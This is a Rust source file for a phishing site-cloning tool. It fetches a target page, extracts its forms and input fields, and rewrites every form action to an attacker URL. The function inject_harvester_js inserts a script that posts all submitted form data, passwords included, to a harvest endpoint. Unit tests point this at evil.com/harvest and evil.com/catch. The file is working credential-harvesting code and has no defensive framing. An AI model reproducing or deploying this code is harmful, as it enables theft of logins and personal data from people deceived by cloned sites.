

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct ClonedSite {
    pub url: String,
    pub html: String,
    pub forms: Vec<String>,
    pub clone_time: String,
    pub total_size: usize,
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct ClonedForm {
    pub action: String,
    pub method: String,
    pub fields: Vec<String>,
    pub field_count: usize,
}

pub struct SiteCloner;

impl SiteCloner {
    pub fn new() -> Self {
        SiteCloner
    }

    pub fn clone(url: &str) -> Result<ClonedSite, String> {
        let resp = reqwest::blocking::get(url)
            .map_err(|e| format!("fetch failed: {}", e))?;
        let html = resp.text().map_err(|e| format!("read body failed: {}", e))?;
        let forms = Self::extract_forms(&html);
        let clone_time = chrono::Utc::now().to_rfc3339();

        Ok(ClonedSite {
            url: url.to_string(),
            html: html.clone(),
            forms: forms.iter().map(|f| format!("{} {}", f.method, f.action)).collect(),
            clone_time,
            total_size: html.len(),
        })
    }

    pub fn extract_forms(html: &str) -> Vec<ClonedForm> {
        let mut forms = Vec::new();
        let mut pos = 0;

        while let Some(start) = html[pos..].to_lowercase().find("<form") {
            let abs_start = pos + start;
            if let Some(end) = html[abs_start..].find("</form>") {
                let form_html = &html[abs_start..abs_start + end + 7];
                let action = Self::extract_attr(form_html, "action");
                let method = {
                    let m = Self::extract_attr(form_html, "method");
                    if m.is_empty() { "get".to_string() } else { m }
                };
                let fields = Self::extract_inputs(form_html);
                forms.push(ClonedForm {
                    action,
                    method,
                    fields: fields.clone(),
                    field_count: fields.len(),
                });
                pos = abs_start + end + 7;
            } else {
                break;
            }
        }
        forms
    }

    fn extract_attr(html: &str, attr: &str) -> String {
        let lower = html.to_lowercase();
        let pattern = format!("{}=\"", attr);
        if let Some(start) = lower.find(&pattern) {
            let val_start = start + pattern.len();
            if let Some(end) = html[val_start..].find('"') {
                return html[val_start..val_start + end].to_string();
            }
        }
        let pattern2 = format!("{}='", attr);
        if let Some(start) = lower.find(&pattern2) {
            let val_start = start + pattern2.len();
            if let Some(end) = html[val_start..].find('\'') {
                return html[val_start..val_start + end].to_string();
            }
        }
        String::new()
    }

    fn extract_inputs(html: &str) -> Vec<String> {
        let mut inputs = Vec::new();
        let lower = html.to_lowercase();
        let mut pos = 0;
        while let Some(start) = lower[pos..].find("<input") {
            let abs = pos + start;
            if let Some(end) = html[abs..].find('>') {
                let input_tag = &html[abs..abs + end + 1];
                let name = Self::extract_attr(input_tag, "name");
                let type_attr = Self::extract_attr(input_tag, "type");
                if !name.is_empty() {
                    inputs.push(format!("{} ({})", name, type_attr));
                }
                pos = abs + end + 1;
            } else {
                break;
            }
        }
        inputs
    }

    pub fn modify_action(html: &str, new_action: &str) -> String {
        let lower = html.to_lowercase();
        let mut result = String::new();
        let mut last = 0;
        let mut pos = 0;

        while let Some(start) = lower[pos..].find("action=\"") {
            let abs = pos + start;
            result.push_str(&html[last..abs]);
            result.push_str(&format!("action=\"{}\"", new_action));
            let val_start = abs + 8;
            if let Some(end) = html[val_start..].find('"') {
                pos = val_start + end + 1;
                last = pos;
            } else {
                break;
            }
        }
        result.push_str(&html[last..]);
        result
    }

    pub fn inject_harvester_js(html: &str, harvest_url: &str) -> String {
        let script = format!(
            r#"<script>
document.addEventListener('submit', function(e) {{
    var form = e.target;
    var data = new FormData(form);
    var params = new URLSearchParams();
    for (var pair of data.entries()) {{
        params.append(pair[0], pair[1]);
    }}
    fetch('{}', {{method:'POST', body:params}});
}});
</script>"#,
            harvest_url
        );
        if let Some(head_end) = html.find("</head>") {
            let mut result = String::new();
            result.push_str(&html[..head_end]);
            result.push_str(&script);
            result.push_str(&html[head_end..]);
            result
        } else if let Some(body_end) = html.find("<body") {
            let mut result = String::new();
            result.push_str(&html[..body_end]);
            result.push_str(&script);
            result.push_str(&html[body_end..]);
            result
        } else {
            format!("{}{}", script, html)
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_extract_forms() {
        let html = "<form action=\"/login\" method=\"post\"><input name=\"user\"><input name=\"pass\" type=\"password\"></form>";
        let forms = SiteCloner::extract_forms(html);
        assert_eq!(forms.len(), 1);
        assert_eq!(forms[0].action, "/login");
    }

    #[test]
    fn test_extract_attr() {
        let html = r#"<input name="email" type="text">"#;
        assert_eq!(SiteCloner::extract_attr(html, "name"), "email");
        assert_eq!(SiteCloner::extract_attr(html, "type"), "text");
    }

    #[test]
    fn test_modify_action() {
        let html = "<form action=\"/login\">";
        let modified = SiteCloner::modify_action(html, "http://evil.com/harvest");
        assert!(modified.contains("http://evil.com/harvest"));
    }

    #[test]
    fn test_inject_harvester_js() {
        let html = "<html><head></head><body>content</body></html>";
        let injected = SiteCloner::inject_harvester_js(html, "http://evil.com/catch");
        assert!(injected.contains("http://evil.com/catch"));
        assert!(injected.contains("fetch"));
    }

    #[test]
    fn test_clone_invalid_url() {
        let result = SiteCloner::clone("http://invalid.url.xyz");
        assert!(result.is_err());
    }

    #[test]
    fn test_cloned_site() {
        let site = ClonedSite {
            url: "http://example.com".to_string(),
            html: "<html></html>".to_string(),
            forms: vec![],
            clone_time: "2026-01-15T10:00:00Z".to_string(),
            total_size: 100,
        };
        let json = serde_json::to_string_pretty(&site).unwrap();
        assert!(json.contains("example.com"));
    }
}
